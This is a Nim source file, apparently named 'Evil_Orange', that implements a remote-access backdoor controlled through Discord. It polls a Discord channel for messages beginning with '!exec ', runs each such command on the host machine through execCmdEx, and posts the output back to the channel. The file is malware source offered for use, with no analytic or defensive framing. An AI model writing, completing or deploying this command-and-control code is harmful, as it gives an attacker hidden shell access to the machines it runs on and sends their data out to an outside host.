import std/[httpclient, json, os, osproc, strutils]
#Hi. Welcome to Evil_Orange. I hope the code will work. have a nice day and please support
const BOTTOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
const CHANNELID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
var lastmessageID = ""
proc send_discord_message(client: HttpClient, content: string)=
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
  client.headers = newHttpHeaders({
    "Authorization": "Bot " & BOT_TOKEN,
    "Content-Type": "application/json"
  })
 #yeah its discord bro
  let safe_content = if content.len > 1900: content[0..1900] & "\n.. [ehh finished]" else: content
  let body = %*{"content": "```\n" & safeContent & "\n```"}
  try:
    discard client.post_content(url, $body)
  except Exception as e: 
    echo "ERROR NUMBER : 18", e.msg
proc poll_commands() =
  let client = newHTTPclient()
  client.headers = newHTTPheaders({"Authorization": "Bot " & BOT_TOKEN})
 # echo "holy sh!t error: 22", e.msg 
  while true:
    try:
      let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages?limit=1"
      let response = client.getContent(url)
      let jsonResponse = parseJson(response)
      if json_Response.len > 0:
        let msg = json_response[0]
        let msgID = msg["id"].getStr()
        let content = msg["content"].getStr()
        let author = msg["author"]["username"].getSTR()
        # tekrar gönderme sorunu çözeceğiz burda
        if msgID != lastmessageID and not content.startsWith("[+]"):
          lastmessageID = msgID
          if content.startsWith("!exec "):
            let command = content[6..^1]
            echo "[*] its working yehuuuu!", command
            let (output, exitCode) = execCmdEx(command)
            send_discord_message(client, output)
    except Exception as e: 
      echo "error 42 . HOW YOU CAN MAKE İT ? ", e.msg 
      #rate limit
    sleep(3000)
when is_Main_Module:
  poll_commands()
